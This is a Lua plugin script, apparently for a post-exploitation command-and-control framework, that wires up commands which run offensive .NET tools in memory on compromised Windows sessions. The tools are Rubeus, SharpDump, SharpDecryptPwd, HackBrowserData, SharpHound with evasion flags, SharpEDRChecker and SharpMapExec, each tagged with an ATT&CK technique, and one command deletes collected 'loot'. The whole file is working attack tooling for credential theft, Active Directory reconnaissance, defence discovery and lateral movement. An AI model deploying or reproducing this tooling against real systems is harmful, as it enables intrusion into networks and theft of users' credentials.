local time = require("time")
local strings = require("strings")
local rpc = require("rpc")

-- adcollector
local function ADcollector(args)
    local session = active()
    local file_path = "common/recon/ADcollector_net4.0.exe"
    return execute_assembly(session, script_resource(file_path), args, true,
                            new_sac())
end
command("common:ADcollector_net4.0", ADcollector, "ADcollector", "T1087.002")

local function HackBrowserData(args)
    local session = active()
    local arch = session.Os.Arch
    local hack_browser_data_file = script_resource(
                                       "common/recon/HackBrowserData." ..
                                           session.Os.Arch .. ".exe")

    local result = execute_exe(session, hack_browser_data_file, args, true, 600,
                               arch, "", new_sac())
    print(result)
    -- sharpblock_exe(hack_browser_data_file, args)
    print("HackBrowserData end")
end
command("common:HackBrowserData", HackBrowserData, "HackBrowserData",
        "T1555.003")

-- ListRDPConnections_net4.5
local function run_ListRDPConnections_net4_5()
    local session = active()
    local list_rdp_connections_net4_5_path =
        "common/recon/ListRDPConnections_net4.5.exe"
    return execute_assembly(session,
                            script_resource(list_rdp_connections_net4_5_path),
                            {}, true, new_sac())
end
command("common:ListRDPConnections_net_4.5", run_ListRDPConnections_net4_5,
        "ListRDPConnections_net4_5", "T1087")
-- end ListRDPConnections_net4.5

-- PVEFINDADUser_net2.0.exe todo
local function PVEFINDADUser_net2_0()
    local session = active()
    local pvefindaduser_net2_0_path = "common/recon/PVEFINDADUser_net2.0.exe"
    local arg = "-current"
    return execute_assembly(session, script_resource(pvefindaduser_net2_0_path),
                            {arg}, true, new_sac())

end
command("common:PVEFINDADUser_net2.0", PVEFINDADUser_net2_0,
        "PVEFINDADUser_net2.0", "T1087.002")
-- end PVEFINDADUser_net2.0.exe

-- Rubeus2.0_Net4.5.exe
local function Rubeus2_0_Net4_5(args)
    local session = active()
    local rubeus2_0_net4_5_path = "common/recon/Rubeus2.0_Net4.5.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_5_path),
                            args, true, new_sac())
end
command("common:Rubeus2.0_Net4.5", Rubeus2_0_Net4_5, "Rubeus2.0_Net4.5", "T1558")
-- end Rubeus2.0_Net4.5.exe

-- Rubeus2.0_Net4.exe
local function Rubeus2_0_Net4()
    local session = active()
    local rubeus2_0_net4_path = "common/recon/Rubeus2.0_Net4.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_path), args,
                            true, new_sac())
end
command("common:Rubeus2.0_Net4", Rubeus2_0_Net4, "Rubeus2.0_Net4", "T1558")
-- end Rubeus2.0_Net4.exe

-- Seatbelt.exe
local function Seatbelt()
    local session = active()
    local seatbelt_path = "common/recon/Seatbelt.exe"
    return execute_assembly(session, script_resource(seatbelt_path), {}, true,
                            new_sac())
end
command("common:Seatbelt", Seatbelt, "Seatbelt", "T1082")
-- end Seatbelt.exe

-- SharpAidnsdump_net4.0.exe
local function SharpAidnsdump_net4_0()
    local session = active()
    local sharpaidnsdump_net4_0_path = "common/recon/SharpAidnsdump_net4.0.exe"
    return execute_assembly(session,
                            script_resource(sharpaidnsdump_net4_0_path), {},
                            true, new_sac())
end
command("common:SharpAidnsdump_net4.0", SharpAidnsdump_net4_0,
        "SharpAidnsdump_net4.0", "T1482")
-- end SharpAidnsdump_net4.0.exe

-- SharpDecryptPwd.exe
local function SharpDecryptPwd(args)
    local session = active()
    local sharpdecryptpwd_path = "common/recon/SharpDecryptPwd.exe"
    return execute_assembly(session, script_resource(sharpdecryptpwd_path),
                            args, true, new_sac())
end
command("common:SharpDecryptPwd", SharpDecryptPwd, "SharpDecryptPwd", "T1003")
-- end SharpDecryptPwd.exe

-- SharpDetectionTLMSSP_net4.0.exe
local function SharpDetectionTLMSSP_net4_0(args)
    local session = active()
    local sharpdetectiontlmssp_net4_0_path =
        "common/recon/SharpDetectionTLMSSP_net4.0.exe"
    return execute_assembly(session,
                            script_resource(sharpdetectiontlmssp_net4_0_path),
                            args, true, new_sac())
end
command("common:SharpDetectionTLMSSP_net4.0", SharpDetectionTLMSSP_net4_0,
        "SharpDetectionTLMSSP_net4.0", "")
-- end SharpDetectionTLMSSP_net4.0.exe

-- SharpDirLister.exe
local function SharpDirLister(args)
    local session = active()
    local sharpdirlister_path = "common/recon/SharpDirLister.exe"
    return execute_assembly(session, script_resource(sharpdirlister_path), args,
                            true, new_sac())
end
command("common:SharpDirLister", SharpDirLister, "SharpDirLister", "T1083")
-- end SharpDirLister.exe

-- SharpDump_net2.0.exe
local function SharpDump_net2_0()
    local session = active()
    local sharpdump_net2_0_path = "common/recon/SharpDump_net2.0.exe"
    return execute_assembly(session, script_resource(sharpdump_net2_0_path), {},
                            true, new_sac())
end
command("common:SharpDump_net2.0", SharpDump_net2_0, "SharpDump_net2.0", "T1003")
-- end SharpDump_net2.0.exe

-- SharpEDRChecker_net4.0.exe
local function SharpEDRChecker_net4_0(args)
    local session = active()
    local sharpedrchecker_net4_0_path =
        "common/recon/SharpEDRChecker_net4.0.exe"
    return execute_assembly(session,
                            script_resource(sharpedrchecker_net4_0_path), args,
                            true, new_sac())
end
command("common:SharpEDRChecker_net4.0", SharpEDRChecker_net4_0,
        "SharpEDRChecker_net4.0", "T1518")
-- end SharpEDRChecker_net4.0.exe

-- SharpEventLog3.5.exe
local function SharpEventLog3_5(args)
    local session = active()
    if not isadmin(session) then
        error("This command requires admin privileges")
    end
    local sharpeventlog3_5_path = "common/recon/SharpEventLog3.5.exe"
    local arg = args[1] or "-4624"
    return execute_assembly(session, script_resource(sharpeventlog3_5_path),
                            {arg}, true, new_sac())
end
command("common:SharpEventLog3.5", SharpEventLog3_5, "SharpEventLog3.5", "T1074")
-- end SharpEventLog3.5.exe

-- SharpEventLog_net4.0.exe
local function SharpEventLog_net4_0()
    local session = active()
    local sharpeventlog_net4_0_path = "common/recon/SharpEventLog_net4.0.exe"
    local arg = args[1] or "-4624"
    return execute_assembly(session, script_resource(sharpeventlog_net4_0_path),
                            {arg}, true, new_sac())
end
command("common:SharpEventLog_net4.0", SharpEventLog_net4_0,
        "SharpEventLog_net4.0", "T1074")
-- end SharpEventLog_net4.0.exe

-- SharpHound_net4.5.exe
local function SharpHound_net4_0()
    local session = active()
    local sharphound_net4_0_path = "common/recon/SharpHound_net4.5.exe"
    local arg = "-c all --RandomizeFilenames --NoSaveCache --EncryptZip"
    local args = strings.split(arg, " ")
    return execute_assembly(session, script_resource(sharphound_net4_0_path),
                            args, true, new_sac())
end
command("common:SharpHound_net4.0", SharpHound_net4_0, "SharpHound_net4.0",
        "T1069")
-- end SharpHound_net4.0.exe

-- SharpInstallSoft_net3.5.exe
local function SharpInstallSoft_net3_5()
    local session = active()
    local sharpinstallsoft_net3_5_path =
        "common/recon/SharpInstallSoft_net3.5.exe"
    return execute_assembly(session,
                            script_resource(sharpinstallsoft_net3_5_path), {},
                            true, new_sac())
end
command("common:SharpInstallSoft_net3.5", SharpInstallSoft_net3_5,
        "SharpInstallSoft_net3.5", "")
-- end SharpInstallSoft_net3.5.exe

-- SharpMapExec_net4.0.exe
local function SharpMapExec_net4_0(args)
    local session = active()
    local sharpmapexec_net4_0_path = "common/recon/SharpMapExec_net4.0.exe"
    execute_assembly(session, script_resource(sharpmapexec_net4_0_path), args,
                     true, new_sac())
    exec(session, "del /f /s /q loot", true) -- todo
end
command("common:SharpMapExec_net4.0", SharpMapExec_net4_0,
        "SharpMapExec_net4.0", "")
-- end SharpMapExec_net4.0.exe

-- SharpOXID-Find_net4.0.exe
local function SharpOXID_Find_net4_0(args)
    local session = active()
    local sharpoxid_find_net4_0_path = "common/recon/SharpOXID-Find_net4.0.exe"
    return execute_assembly(session,
                            script_resource(sharpoxid_find_net4_0_path), args,
                            true, new_sac())
end
command("common:SharpOXID-Find_net4.0", SharpOXID_Find_net4_0,
        "SharpOXID-Find_net4.0", "")
-- end SharpOXID-Find_net4.0.exe

-- SharpRDPCheck_net4.6.exe
local function SharpRDPCheck_net4_6(args)
    local session = active()
    local sharprdpcheck_net4_6_path = "common/recon/SharpRDPCheck_net4.6.exe"
    return execute_assembly(session, script_resource(sharprdpcheck_net4_6_path),
                            args, true, new_sac())
end
command("common:SharpRDPCheck_net4.6", SharpRDPCheck_net4_6,
        "SharpRDPCheck_net4.6", "")
-- end SharpRDPCheck_net4.6.exe

-- SharpSearch_net3.5.exe
local function SharpSearch_net3_5(args)
    local session = active()
    local sharpsearch_net3_5_path = "common/recon/SharpSearch_net3.5.exe"
    return execute_assembly(session, script_resource(sharpsearch_net3_5_path),
                            args, true, new_sac())
end
command("common:SharpSearch_net3.5", SharpSearch_net3_5, "SharpSearch_net3.5",
        "")
-- end SharpSearch_net3.5.exe

-- SharpShares_net4.0.exe
local function SharpShares_net4_0(args)
    local session = active()
    local sharpshares_net4_0_path = "common/recon/SharpShares_net4.0.exe"
    return execute_assembly(session, script_resource(sharpshares_net4_0_path),
                            args, true, new_sac())
end
command("common:SharpShares_net4.0", SharpShares_net4_0, "SharpShares_net4.0",
        "")
